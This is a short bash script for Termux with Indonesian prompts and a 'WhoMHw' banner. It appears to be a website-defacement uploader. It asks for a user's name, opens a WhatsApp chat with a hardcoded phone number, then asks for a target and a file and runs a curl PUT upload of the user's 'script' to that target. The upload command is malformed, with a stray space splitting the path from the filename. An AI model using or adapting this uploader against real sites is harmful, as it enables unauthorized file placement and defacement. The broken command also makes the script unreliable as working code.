#!/bin/bash
#usr/bin/sh


echo "=============================================================================="
echo "                          Punya W.=WhoMHw                                    "
echo "______________________________________________________________________________"
echo "----------------------WhoMHw ------------------------------------------------"
echo "===========<=<=<=<=<=<=<=<==<=<=<=<=<=<==<=<==<=<><=<><=<<=<><<==<=<=<=<=<<=_"
 echo "selamat datang kaka,siapa nama kaka?" #tulisan keluar
read nick #membaca tulisan
clear
echo "install dulu" $nick
sleep 2
termux-open https://wa.me/+6285336515046?text=hai+kaka
echo "jangan lupas script nya ditaruh di internall ya.!!" $nick
echo "masukkan nama target"
read target
echo "masukkan file kamu"
read file
echo "mengapluod script lu......"
curl -T /storage/emulated/0/ $file $target
clear
echo "terimakasih sudah datang" $nick
